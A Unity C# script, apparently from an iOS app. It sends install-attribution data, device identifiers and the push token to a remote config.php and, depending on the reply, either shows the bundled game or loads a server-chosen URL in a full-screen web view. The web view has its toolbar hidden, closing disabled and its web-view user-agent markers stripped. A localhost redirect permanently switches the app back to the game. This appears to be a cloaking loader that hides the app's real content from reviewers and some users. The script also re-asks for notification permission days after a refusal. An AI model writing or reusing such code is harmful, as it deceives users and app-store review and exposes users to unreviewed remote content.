using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Text;
using System.Threading.Tasks;
using AppsFlyerSDK;
using Castle.Core.Internal;
using Firebase.Messaging;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.UI;
using UnityEngine.Networking;
using Firebase;

public class MyBrainStoppedWorkingHere : MonoBehaviour, IAppsFlyerConversionData
{
    [SerializeField] ScreenOrientation forcedScreenOrientation = ScreenOrientation.Portrait;
    [SerializeField] string endpoint;
    [SerializeField] string appsflyerDevID;
    [SerializeField] string IOS_ID;
    [SerializeField] private List<GameObject> sleepingObjects;

    Transform loadingScreen, notificationRequestScreen, noNetScreen;

    UniWebView _webView;

    Dictionary<string, object> _conversionDictionary = new Dictionary<string, object>();
    ConversionStatus _conversionStatus = ConversionStatus.tbd;
    bool fbrq = false;
    string _w = "";

    void Awake()
    {
        if (PushStatusState == PushStatus.good)
            FirebaseMessaging.MessageReceived += OnMessageRecieved;
        if (!SavedPushData.IsNullOrEmpty())
        {
            _w = SavedPushData;
            SavedPushData = null;
            fbrq = true;
        }
        loadingScreen = transform.GetChild(0).GetChild(1);
        notificationRequestScreen = transform.GetChild(0).GetChild(2);
        noNetScreen = transform.GetChild(0).GetChild(3);
    }

    IEnumerator Start()
    {
        if (!zxcsigns.IsNullOrEmpty())
        {
            gameObject.SetActive(false);
            yield break;
        }
        if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus() == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
        {
            ATTrackingStatusBinding.RequestAuthorizationTracking();
        }

        SetupStatics();
        SetupWebView();

        yield return WaitForConversion();
        var isconvsent = false;
        if (!fbrq)
            yield return ConversionActions(success =>
            {
                isconvsent = success;
            });
        if ((_conversionStatus == ConversionStatus.good || alreadyDone == 1) && !fbrq)
        {
            if (isconvsent || alreadyDone == 1)
            {
                if (Application.internetReachability == NetworkReachability.NotReachable)
                {
                    noNetScreen.gameObject.SetActive(true);
                    loadingScreen.gameObject.SetActive(false);
                    notificationRequestScreen.gameObject.SetActive(false);
                }
                else
                {
                    alreadyDone = 1;
                    LoadActions(_w);
                }
                yield return ReqAction();
            }
            else
                gameObject.SetActive(false);
        }
        else if ((isconvsent || alreadyDone == 1) && Application.internetReachability == NetworkReachability.NotReachable)
        {
            noNetScreen.gameObject.SetActive(true);
            loadingScreen.gameObject.SetActive(false);
            notificationRequestScreen.gameObject.SetActive(false);
        }
        else if (fbrq)
            LoadActions(_w);
        else
            gameObject.SetActive(false);
    }
    IEnumerator ReqAction(){
        if (PushStatusState == PushStatus.denied)
        {
            string declineTimestamp = PlayerPrefs.GetString("NotificationDeclineTimestamp");
            if (!string.IsNullOrEmpty(declineTimestamp))
            {
                DateTime declineDate = DateTime.Parse(declineTimestamp);
                if ((DateTime.Now - declineDate).Days >= 3)
                    yield return reqDelay();
            }
        }
        else if (PushStatusState == PushStatus.tbd)
            yield return reqDelay();
    }
    bool _doReq = false;
    IEnumerator reqDelay(){
        _doReq = true;
        _webView.Hide();
        yield return RequestNotifications();
        if(didFinish){
            notificationRequestScreen.gameObject.SetActive(false);
            _webView.Show();
        }
        _doReq = false;
        notificationRequestScreen.gameObject.SetActive(false);
    }
    bool isDelayed = false;
    IEnumerator Delay(){
        if(!isDelayed)
        {
            isDelayed = true;
            yield return new WaitForSeconds(3f);
            StartCoroutine(ConversionActions(null));
        }
    }

    IEnumerator RequestNotifications()
    {
        bool buttonPressed = false;
        notificationRequestScreen.gameObject.SetActive(true);
        Button acceptButton = notificationRequestScreen.Find("Accept").GetComponent<Button>();
        Button declineButton = notificationRequestScreen.Find("Decline").GetComponent<Button>();
        acceptButton.onClick.AddListener(() =>
        {
            PushStatusState = PushStatus.good;
            acceptButton.onClick.RemoveAllListeners();
            buttonPressed = true;
        });
        declineButton.onClick.AddListener(() =>
        {
            PushStatusState = PushStatus.denied;
            PlayerPrefs.SetString("NotificationDeclineTimestamp", DateTime.Now.ToString());
            declineButton.onClick.RemoveAllListeners();
            buttonPressed = true;
        });
        yield return new WaitWhile(() => !buttonPressed);
        if (PushStatusState == PushStatus.good)
        {
            yield return FirebaseMessaging.RequestPermissionAsync();
            FirebaseMessaging.MessageReceived += OnMessageRecieved;
            FirebaseMessaging.TokenReceived += OnTokenRecieved;
            float curTime = Time.time;
            yield return new WaitWhile(() => FirebaseToken.IsNullOrEmpty() && Time.time - curTime < 10f);
        }
    }

    void SetupStatics(){
        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetEnableKeyboardAvoidance(true);
    }

    void SetupWebView()
    {
        _webView = gameObject.AddComponent<UniWebView>();
        _webView.EmbeddedToolbar.Hide();
        _webView.SetSupportMultipleWindows(false, true);
        _webView.SetAllowFileAccess(true);
        _webView.SetCalloutEnabled(true);
        _webView.SetBackButtonEnabled(true);
        _webView.OnShouldClose += webView => false;
        _webView.SetAllowBackForwardNavigationGestures(true);
        _webView.OnOrientationChanged += OnScreenOrientationChange;
        StartCoroutine(uragch());
        _webView.OnPageStarted += (view, url) =>
        {
            if (url.Contains("sub_id_2=99999"))
                UniWebView.ClearCookies();
            if (url.Contains("https://localhost"))
            {
                zxcsigns = "value";
                _webView.Hide();
                Destroy(_webView);
                gameObject.SetActive(false);
            }
        };
        _webView.OnLoadingErrorReceived += (webView, code, message, payload) =>
        {
            if (code is not (-1007 or -9 or 0)) return;
            if (payload.Extra != null && payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
                webView.Load((string)value);
        };
        _webView.OnPageFinished += (view, code, url) => SuperDuper();
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);

        IEnumerator uragch(){
            yield return new WaitWhile(() => _webView.GetUserAgent() == null);
            _webView.SetUserAgent(_webView.GetUserAgent().Replace("; wv", "").Replace(" Version/4.0", ""));
        }
    }

    void OnScreenOrientationChange(UniWebView view, ScreenOrientation orientation)
    {
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
    }

    string SavedPushData
    {
        get
        {
            return PlayerPrefs.GetString("nnm", "");
        }
        set
        {
            PlayerPrefs.SetString("nnm", value);
            PlayerPrefs.Save();
        }
    }
    string zxcsigns
    {
        get
        {
            return PlayerPrefs.GetString("zxcsigns", "");
        }
        set
        {
            PlayerPrefs.SetString("zxcsigns", value);
            PlayerPrefs.Save();
        }
    }
    string SavedConversionData
    {
        get
        {
            return PlayerPrefs.GetString("conversion", "");
        }
        set
        {
            PlayerPrefs.SetString("conversion", value);
            PlayerPrefs.Save();
        }
    }
    PushStatus PushStatusState
    {
        get
        {
            return (PushStatus)PlayerPrefs.GetInt("push", (int)PushStatus.tbd);
        }
        set
        {
            PlayerPrefs.SetInt("push", (int)value);
            PlayerPrefs.Save();
        }
    }
    private string SavedUrl
    {
        get
        {
            return PlayerPrefs.GetString("ladakalina", string.Empty);
        }
        set
        {
            PlayerPrefs.SetString("ladakalina", value);
            PlayerPrefs.Save();
        }
    }
    string FirebaseToken
    {
        get
        {
            return PlayerPrefs.GetString("firebaseToken", "");
        }
        set
        {
            PlayerPrefs.SetString("firebaseToken", value);
            PlayerPrefs.Save();
        }
    }
    int alreadyDone
    {
        get
        {
            return PlayerPrefs.GetInt("alreadyDone", 0);
        }
        set
        {
            PlayerPrefs.SetInt("alreadyDone", value);
            PlayerPrefs.Save();
        }
    }

    IEnumerator WaitForConversion()
    {
        if (!SavedConversionData.IsNullOrEmpty())
        {
            _conversionDictionary = AppsFlyer.CallbackStringToDictionary(SavedConversionData);
            _conversionStatus = ConversionStatus.good;
        }
        AppsFlyer.initSDK(appsflyerDevID, IOS_ID, this);
        AppsFlyer.startSDK();
        if (_conversionDictionary["af_status"].ToString().ToLower() == "organic")
        {
            yield return new WaitForSeconds(5f);
            yield return FetchInstallData(conversion => _conversionDictionary = conversion);
        }
        float curTime = Time.time;
        yield return new WaitWhile(() => _conversionStatus == ConversionStatus.tbd && Time.time - curTime < 10f);
    }

    enum ConversionStatus
    {
        good,
        bad,
        tbd
    }

    enum PushStatus
    {
        good,
        bad,
        tbd,
        denied
    }

    public void onConversionDataSuccess(string conversionData)
    {
        if (_conversionStatus == ConversionStatus.good) return;
        SavedConversionData = conversionData;
        _conversionStatus = ConversionStatus.good;
        _conversionDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
    }

    public void onConversionDataFail(string error)
    {
        _conversionStatus = ConversionStatus.bad;
    }
    public void onAppOpenAttribution(string attributionData)
    {
        throw new NotImplementedException();
    }
    public void onAppOpenAttributionFailure(string error)
    {
        throw new NotImplementedException();
    }

    private void OnDisable()
    {
        Screen.orientation = forcedScreenOrientation;
        Screen.autorotateToPortrait = false;
        Screen.autorotateToPortraitUpsideDown = false;
        Screen.autorotateToLandscapeLeft = false;
        Screen.autorotateToLandscapeRight = false;
        sleepingObjects.ForEach(x => x.SetActive(true));
    }
    void OnMessageRecieved(object sender, MessageReceivedEventArgs e)
    {
        var data = e.Message.Data;
        Debug.Log($"message data {data}");
        if (!data.TryGetValue("url", out var url)) return;
        if (e.Message.NotificationOpened) SavedPushData = url;
        fbrq = true;
        LoadActions(url);
    }
    void OnTokenRecieved(object sender, TokenReceivedEventArgs e)
    {
        FirebaseToken = e.Token;
        StartCoroutine(Delay());
    }

    void LoadActions(string n)
    {
        _webView.Load(n);
    }

    IEnumerator ConversionActions(Action<bool> c)
    {
        _conversionDictionary.TryAdd($"af_id", AppsFlyer.getAppsFlyerId());
        _conversionDictionary.TryAdd("bundle_id", Application.identifier);
        _conversionDictionary.TryAdd("store_id", $"id{IOS_ID}");
        _conversionDictionary.TryAdd("locale", CultureInfo.CurrentCulture.Name);
        _conversionDictionary.TryAdd("os", "iOS");
        if (!FirebaseToken.IsNullOrEmpty()) _conversionDictionary.TryAdd("push_token", FirebaseToken);
        if (!FirebaseToken.IsNullOrEmpty()) _conversionDictionary.TryAdd("firebase_project_id", Firebase.FirebaseApp.DefaultInstance.Options.ProjectId);
        var jsonObject = DictToJson(_conversionDictionary);
        var request = new UnityWebRequest($"{endpoint.TrimEnd('/')}/config.php", "POST")
        {
            uploadHandler = new UploadHandlerRaw(Encoding.UTF8.GetBytes(jsonObject)),
            downloadHandler = new DownloadHandlerBuffer()
        };

        request.SetRequestHeader("Content-Type", "application/json");

        yield return request.SendWebRequest();
        if (request.result == UnityWebRequest.Result.Success)
        {
            var response = request.downloadHandler.text;
            var responseDict = AppsFlyer.CallbackStringToDictionary(response);
            if (responseDict.TryGetValue("ok", out var value) && value is bool ok && ok)
            {
                if (responseDict.TryGetValue("url", out var url))
                {
                    SavedUrl = url.ToString();
                    _w = SavedUrl;
                    c?.Invoke(true);
                    yield break;
                }
                else
                {
                    c?.Invoke(false);
                }
            }
            else
            {
                c?.Invoke(false);
            }
        }
        else
        {
            c?.Invoke(false);
        }
    }
    bool didFinish = false;
    void SuperDuper()
    {
        didFinish = true;
        loadingScreen.gameObject.SetActive(false);
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
        if(!_doReq)
            _webView.Show();
        SavedPushData = null;
        fbrq = false;
    }

    string DictToJson(Dictionary<string, object> dictionary)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append('{');

        bool first = true;
        foreach (var kvp in dictionary)
        {
            if (!first)
            {
                sb.Append(',');
            }
            first = false;

            sb.Append('"').Append(EscapeJsonString(kvp.Key)).Append("\":");

            if (kvp.Value is string str)
            {
                sb.Append('"').Append(EscapeJsonString(str)).Append('"');
            }
            else if (kvp.Value is bool boolValue)
            {
                sb.Append(boolValue ? "true" : "false");
            }
            else if (kvp.Value is int intValue)
            {
                sb.Append(intValue);
            }
            else if (kvp.Value is double doubleValue)
            {
                sb.Append(doubleValue);
            }
            else if (kvp.Value is Dictionary<string, object> nestedDict)
            {
                sb.Append(DictToJson(nestedDict));
            }
            else if (kvp.Value is IEnumerable<object> list)
            {
                sb.Append('[');
                bool firstItem = true;
                foreach (var item in list)
                {
                    if (!firstItem)
                    {
                        sb.Append(',');
                    }
                    firstItem = false;

                    if (item is string itemStr)
                    {
                        sb.Append('"').Append(EscapeJsonString(itemStr)).Append('"');
                    }
                    else if (item is bool itemBool)
                    {
                        sb.Append(itemBool ? "true" : "false");
                    }
                    else if (item is int itemInt)
                    {
                        sb.Append(itemInt);
                    }
                    else if (item is double itemDouble)
                    {
                        sb.Append(itemDouble);
                    }
                    else if (item is Dictionary<string, object> itemDict)
                    {
                        sb.Append(DictToJson(itemDict));
                    }
                    else
                    {
                        sb.Append("null");
                    }
                }
                sb.Append(']');
            }
            else
            {
                sb.Append("null");
            }
        }

        sb.Append('}');
        return sb.ToString();
    }

    string EscapeJsonString(string str)
    {
        return str.Replace("\\", "\\\\")
                  .Replace("\"", "\\\"")
                  .Replace("\b", "\\b")
                  .Replace("\f", "\\f")
                  .Replace("\n", "\\n")
                  .Replace("\r", "\\r")
                  .Replace("\t", "\\t");
    }
    
    private IEnumerator FetchInstallData(Action<Dictionary<string, object>> callback)
    {
        var url = $"https://gcdsdk.appsflyer.com/install_data/v4.0/{Application.identifier}?devkey={appsflyerDevID}&device_id={AppsFlyer.getAppsFlyerId()}";
        using var request = UnityWebRequest.Get(url);
        request.SetRequestHeader("accept", "application/json");

        yield return request.SendWebRequest();

        if (request.result != UnityWebRequest.Result.Success)
        {
            callback?.Invoke(null);
            yield break;
        }

        try
        {
            var data = AppsFlyer.CallbackStringToDictionary(request.downloadHandler.text);
            callback?.Invoke(data);
        }
        catch
        {
            callback?.Invoke(null);
        }
    }
}